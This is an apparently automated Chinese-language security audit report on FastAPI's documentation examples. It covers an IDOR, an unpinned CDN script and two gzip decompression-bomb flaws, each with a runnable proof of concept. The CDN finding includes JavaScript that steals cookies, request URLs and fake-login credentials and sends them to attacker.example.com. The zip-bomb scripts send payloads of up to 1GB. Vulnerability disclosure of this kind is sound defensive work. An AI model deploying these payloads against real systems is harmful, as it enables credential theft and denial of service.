# CodeSentinel 安全审计报告

## 项目信息
- **项目名称:** fastapi
- **编程语言:** {"Python": 100.0}
- **文件数量:** 1129
- **审计时间:** 2026-07-11 19:58:07

## 执行摘要

本次安全审计针对开源项目FastAPI（https://github.com/fastapi/fastapi）进行。审计发现4个已确认的安全漏洞，包括1个不安全的直接对象引用（IDOR）、1个不安全的第三方资源引用（供应链攻击风险）以及2个压缩炸弹/拒绝服务（DoS）漏洞。这些漏洞主要存在于项目的文档示例代码中，但若用户直接复制到生产环境使用，将面临严重的安全风险。整体风险评分为75，属于高风险等级。建议开发团队立即修复高优先级漏洞，并在文档中明确安全警告。

**风险评分:** 75/100

## 漏洞统计

| 严重等级 | 数量 |
|---------|------|
| Critical | 0 |
| High | 1 |
| Medium | 3 |
| Low | 0 |
| **总计** | **4** |

## 漏洞详情

### VULN-39C8AC91 - 不安全的直接对象引用（IDOR）

- **严重等级:** MEDIUM
- **文件位置:** `docs_src\app_testing\app_b_an_py310\main.py:19`
- **数据流:** 用户通过URL路径参数item_id直接访问数据库中的对象，认证仅依赖共享令牌，没有基于用户角色的访问控制。
- **判断理由:** 虽然存在令牌认证，但所有持有有效令牌的用户都可以访问任何item_id对应的数据，没有实现基于用户或角色的访问控制。攻击者可以枚举item_id来获取所有数据。

**代码片段:**
```
if item_id not in fake_db:
        raise HTTPException(status_code=404, detail="Item not found")
    return fake_db[item_id]
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC - 不安全的直接对象引用（IDOR）漏洞利用
仅供安全研究使用
"""

import requests
import sys

# 目标API基础URL
BASE_URL = "http://localhost:8000"

# 硬编码的共享令牌（从源代码中获取）
TOKEN = "coneofsilence"

# 已知的item_id列表（可从源代码或枚举获得）
KNOWN_ITEMS = ["foo", "bar"]

# 用于枚举的ID范围（如果存在更多项目）
ENUMERATION_IDS = ["foo", "bar", "baz", "qux", "admin", "user1", "test", "secret"]


def exploit_known_items():
    """利用已知的item_id获取数据"""
    print("[*] 尝试访问已知的item_id...")
    print("=" * 50)
    
    for item_id in KNOWN_ITEMS:
        url = f"{BASE_URL}/items/{item_id}"
        headers = {"X-Token": TOKEN}
        
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print(f"[+] 成功获取 item '{item_id}':")
                print(f"    响应: {response.json()}")
                print()
            else:
                print(f"[-] 获取 item '{item_id}' 失败: HTTP {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] 请求错误: {e}")


def enumerate_items():
    """枚举可能的item_id以发现更多数据"""
    print("[*] 开始枚举可能的item_id...")
    print("=" * 50)
    
    found_items = []
    
    for item_id in ENUMERATION_IDS:
        url = f"{BASE_URL}/items/{item_id}"
        headers = {"X-Token": TOKEN}
        
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print(f"[+] 发现可访问的 item '{item_id}':")
                print(f"    响应: {response.json()}")
                found_items.append(item_id)
                print()
            elif response.status_code == 404:
                print(f"[-] item '{item_id}' 不存在 (404)")
            elif response.status_code == 400:
                print(f"[-] item '{item_id}' 访问被拒绝 (400 - 令牌无效)")
        except requests.exceptions.RequestException as e:
            print(f"[!] 请求错误: {e}")
    
    return found_items


def create_malicious_item():
    """演示如何利用IDOR创建任意数据（如果存在POST端点）"""
    print("[*] 演示：利用POST端点创建任意数据...")
    print("=" * 50)
    
    # 尝试创建一个新的item，即使没有权限也应该能成功（因为没有访问控制）
    new_item = {
        "id": "malicious_item",
        "title": "Hacked Item",
        "description": "This item was created by an unauthorized user"
    }
    
    url = f"{BASE_URL}/items/"
    headers = {"X-Token": TOKEN}
    
    try:
        response = requests.post(url, json=new_item, headers=headers)
        if response.status_code == 200 or response.status_code == 201:
            print(f"[+] 成功创建恶意item: {response.json()}")
            
            # 验证新创建的item可以被访问
            verify_url = f"{BASE_URL}/items/{new_item['id']}"
            verify_response = requests.get(verify_url, headers=headers)
            if verify_response.status_code == 200:
                print(f"[+] 验证：新创建的item可被访问: {verify_response.json()}")
        elif response.status_code == 409:
            print(f"[-] item已存在 (409)")
        else:
            print(f"[-] 创建失败: HTTP {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求错误: {e}")


def main():
    """主函数"""
    print("=" * 60)
    print("PoC: 不安全的直接对象引用（IDOR）漏洞利用")
    print("目标: FastAPI应用 - 共享令牌认证但无用户级访问控制")
    print("仅供安全研究使用")
    print("=" * 60)
    print()
    
    # 步骤1: 利用已知的item_id
    exploit_known_items()
    
    # 步骤2: 枚举可能的item_id
    print("\n" + "=" * 60)
    found = enumerate_items()
    
    if found:
        print(f"\n[+] 枚举完成，发现 {len(found)} 个可访问的item: {found}")
    else:
        print("\n[-] 枚举完成，未发现新的可访问item")
    
    # 步骤3: 演示创建任意数据
    print("\n" + "=" * 60)
    create_malicious_item()
    
    print("\n" + "=" * 60)
    print("PoC执行完成")
    print("=" * 60)


if __name__ == "__main__":
    main()
```

---

### VULN-BA3B0BCE - 不安全的第三方资源引用（供应链攻击风险）

- **严重等级:** MEDIUM
- **文件位置:** `docs_src\custom_docs_ui\tutorial001_py310.py:14`
- **数据流:** 静态资源URL硬编码在代码中，直接从unpkg CDN加载JavaScript文件
- **判断理由:** 使用unpkg.com作为CDN加载Swagger UI的JavaScript文件存在供应链攻击风险。如果unpkg被攻破或域名被劫持，攻击者可以替换该JS文件为恶意代码，从而在用户浏览器中执行任意JavaScript。建议将关键前端资源托管在受控的服务器上，或使用Subresource Integrity (SRI) 校验。

**代码片段:**
```
swagger_js_url="https://unpkg.com/swagger-ui-dist@5/swagger-ui-bundle.js"
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - 供应链攻击PoC：模拟unpkg CDN被劫持后替换Swagger UI JS文件
# 前置条件：攻击者已控制unpkg.com或通过DNS劫持/中间人攻击拦截请求

# 1. 创建恶意JS文件（模拟XSS payload）
echo '// 仅供研究使用 - 恶意Swagger UI bundle
(function() {
    // 窃取API请求中的敏感信息
    var originalFetch = window.fetch;
    window.fetch = function() {
        var args = arguments;
        console.log("[恶意代码] 拦截到fetch请求:", args[0]);
        // 将请求信息发送到攻击者服务器
        var img = new Image();
        img.src = "https://attacker.example.com/steal?url=" + encodeURIComponent(args[0]);
        return originalFetch.apply(this, args);
    };
    
    // 窃取cookie
    document.addEventListener("DOMContentLoaded", function() {
        var img = new Image();
        img.src = "https://attacker.example.com/steal?cookie=" + encodeURIComponent(document.cookie);
    });
    
    // 显示伪造的登录框
    setTimeout(function() {
        var fakeLogin = document.createElement("div");
        fakeLogin.innerHTML = `
            <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;display:flex;justify-content:center;align-items:center;">
                <div style="background:white;padding:20px;border-radius:5px;">
                    <h3>会话已过期，请重新登录</h3>
                    <input type="text" id="fake-user" placeholder="用户名"><br>
                    <input type="password" id="fake-pass" placeholder="密码"><br>
                    <button onclick="stealCreds()">登录</button>
                </div>
            </div>
        `;
        document.body.appendChild(fakeLogin);
        window.stealCreds = function() {
            var user = document.getElementById("fake-user").value;
            var pass = document.getElementById("fake-pass").value;
            var img = new Image();
            img.src = "https://attacker.example.com/steal?user=" + encodeURIComponent(user) + "&pass=" + encodeURIComponent(pass);
            alert("登录失败，请重试");
        };
    }, 3000);
})();' > malicious_swagger_ui_bundle.js

echo "[PoC] 已生成恶意JS文件: malicious_swagger_ui_bundle.js"
echo ""
echo "攻击流程："
echo "1. 攻击者通过DNS劫持或CDN漏洞，将unpkg.com/swagger-ui-dist@5/swagger-ui-bundle.js"
echo "   替换为上述恶意文件"
echo "2. 用户访问FastAPI应用的/docs端点时，浏览器加载恶意JS"
echo "3. 恶意代码执行：窃取cookie、拦截API请求、显示伪造登录框"
echo ""
echo "防御建议："
echo "- 使用SRI (Subresource Integrity) 校验资源完整性"
echo "- 将Swagger UI资源托管在自有服务器上"
echo "- 使用内容安全策略(CSP)限制脚本来源"
```

---

### VULN-F05B9C2E - 不安全的解压缩（Zip Bomb / 压缩炸弹攻击）

- **严重等级:** HIGH
- **文件位置:** `docs_src/custom_request_and_route/tutorial001_py310.py:11`
- **数据流:** 用户通过HTTP请求发送gzip压缩数据 -> GzipRequest.body()方法接收 -> gzip.decompress(body)直接解压，未做大小限制
- **判断理由:** 代码直接使用gzip.decompress()解压用户提供的压缩数据，没有对解压后数据的大小进行任何限制。攻击者可以发送一个极小的压缩包（压缩炸弹），解压后产生巨大的数据量，导致服务器内存耗尽或CPU过载，造成拒绝服务攻击。这是一个经典的压缩炸弹攻击向量。

**代码片段:**
```
body = gzip.decompress(body)
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC - 压缩炸弹攻击 (Zip Bomb)
仅供安全研究使用，请勿用于非法用途。
"""
import gzip
import requests
import sys

# 目标URL（假设FastAPI应用运行在本地8000端口）
TARGET_URL = "http://localhost:8000/sum"

# 生成压缩炸弹：一个极小的gzip压缩包，解压后产生大量数据
# 这里使用10MB的重复数据，实际攻击中可以更大
UNCOMPRESSED_SIZE = 10 * 1024 * 1024  # 10 MB
payload_data = b"A" * UNCOMPRESSED_SIZE

# 使用最高压缩级别压缩，生成极小的压缩包
compressed_payload = gzip.compress(payload_data, compresslevel=9)

print(f"[+] 原始数据大小: {UNCOMPRESSED_SIZE} bytes ({UNCOMPRESSED_SIZE/1024/1024:.2f} MB)")
print(f"[+] 压缩后数据大小: {len(compressed_payload)} bytes ({len(compressed_payload)/1024:.2f} KB)")
print(f"[+] 压缩比: {UNCOMPRESSED_SIZE / len(compressed_payload):.2f}x")

# 发送恶意请求
headers = {
    "Content-Encoding": "gzip",
    "Content-Type": "application/json"
}

try:
    print(f"[+] 发送压缩炸弹到 {TARGET_URL} ...")
    response = requests.post(TARGET_URL, data=compressed_payload, headers=headers, timeout=30)
    print(f"[!] 服务器响应状态码: {response.status_code}")
    print(f"[!] 响应内容: {response.text[:200]}...")
except requests.exceptions.Timeout:
    print("[!] 请求超时 - 服务器可能已崩溃或响应缓慢")
except requests.exceptions.ConnectionError as e:
    print(f"[!] 连接错误 - 服务器可能已崩溃: {e}")
except Exception as e:
    print(f"[!] 其他错误: {e}")

print("\n[+] PoC执行完毕。")
print("[!] 注意：如果服务器内存不足，可能导致拒绝服务。请仅在测试环境中运行。")
```

---

### VULN-E551AB42 - 缺少输入验证和大小限制

- **严重等级:** MEDIUM
- **文件位置:** `docs_src/custom_request_and_route/tutorial001_py310.py:10`
- **数据流:** 用户控制Content-Encoding头 -> 触发解压缩逻辑 -> 无限制解压
- **判断理由:** 代码仅检查Content-Encoding头是否包含'gzip'字符串，但没有验证解压后body的大小，也没有对原始压缩数据的大小做限制。攻击者可以发送任意大小的压缩数据，或者通过精心构造的压缩数据导致服务器资源耗尽。

**代码片段:**
```
if "gzip" in self.headers.getlist("Content-Encoding"):
    body = gzip.decompress(body)
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC - 仅供研究使用
漏洞: VULN-E551AB42 - Gzip解压炸弹攻击
目标: FastAPI自定义GzipRequest示例代码
"""

import gzip
import requests
import sys
import time

# 目标URL (假设服务运行在本地8000端口)
TARGET_URL = "http://localhost:8000/sum"

def create_zip_bomb(target_size_mb: int = 100) -> bytes:
    """
    创建一个解压炸弹
    通过大量重复数据实现高压缩比
    """
    # 使用重复的零字节，压缩比极高
    # 1MB压缩数据可解压出数GB
    payload = b"\x00" * (target_size_mb * 1024 * 1024)
    compressed = gzip.compress(payload)
    print(f"[INFO] 压缩数据大小: {len(compressed)/1024:.2f} KB")
    print(f"[INFO] 解压后数据大小: {len(payload)/1024/1024:.2f} MB")
    print(f"[INFO] 压缩比: {len(payload)/len(compressed):.2f}x")
    return compressed

def send_exploit(compressed_data: bytes) -> None:
    """
    发送恶意请求
    """
    headers = {
        "Content-Encoding": "gzip",
        "Content-Type": "application/json"
    }
    
    print(f"\n[ATTACK] 发送解压炸弹请求...")
    print(f"[ATTACK] 目标: {TARGET_URL}")
    print(f"[ATTACK] 压缩数据大小: {len(compressed_data)/1024:.2f} KB")
    
    try:
        start_time = time.time()
        response = requests.post(
            TARGET_URL,
            data=compressed_data,
            headers=headers,
            timeout=30
        )
        elapsed = time.time() - start_time
        print(f"[RESULT] 响应状态码: {response.status_code}")
        print(f"[RESULT] 响应时间: {elapsed:.2f}秒")
        print(f"[RESULT] 响应内容: {response.text[:200]}...")
        
    except requests.exceptions.Timeout:
        print("[RESULT] 请求超时 - 服务器可能已崩溃或资源耗尽")
    except requests.exceptions.ConnectionError as e:
        print(f"[RESULT] 连接错误: {e}")
        print("[RESULT] 服务器可能已崩溃")
    except Exception as e:
        print(f"[RESULT] 其他错误: {e}")

def test_normal_request() -> None:
    """
    测试正常请求以确认服务可用
    """
    print("\n[TEST] 发送正常请求测试...")
    try:
        response = requests.post(
            TARGET_URL,
            json=[1, 2, 3, 4, 5],
            timeout=10
        )
        print(f"[TEST] 正常请求响应: {response.json()}")
        return True
    except Exception as e:
        print(f"[TEST] 服务不可用: {e}")
        return False

def main():
    print("=" * 60)
    print("PoC - 仅供研究使用")
    print("漏洞: VULN-E551AB42 - Gzip解压炸弹攻击")
    print("=" * 60)
    
    # 检查服务是否可用
    if not test_normal_request():
        print("\n[ERROR] 目标服务不可用，请确保服务正在运行")
        sys.exit(1)
    
    # 创建不同大小的解压炸弹进行测试
    print("\n" + "=" * 60)
    print("阶段1: 小规模测试 (10MB解压数据)")
    print("=" * 60)
    bomb_small = create_zip_bomb(10)
    send_exploit(bomb_small)
    
    print("\n" + "=" * 60)
    print("阶段2: 中等规模测试 (100MB解压数据)")
    print("=" * 60)
    bomb_medium = create_zip_bomb(100)
    send_exploit(bomb_medium)
    
    print("\n" + "=" * 60)
    print("阶段3: 大规模攻击 (1GB解压数据)")
    print("=" * 60)
    print("[WARNING] 此阶段可能导致服务器崩溃!")
    confirm = input("是否继续? (y/N): ")
    if confirm.lower() == 'y':
        bomb_large = create_zip_bomb(1024)
        send_exploit(bomb_large)
    
    print("\n" + "=" * 60)
    print("PoC执行完毕")
    print("=" * 60)

if __name__ == "__main__":
    main()
```

---



*报告由 CodeSentinel 自动生成*
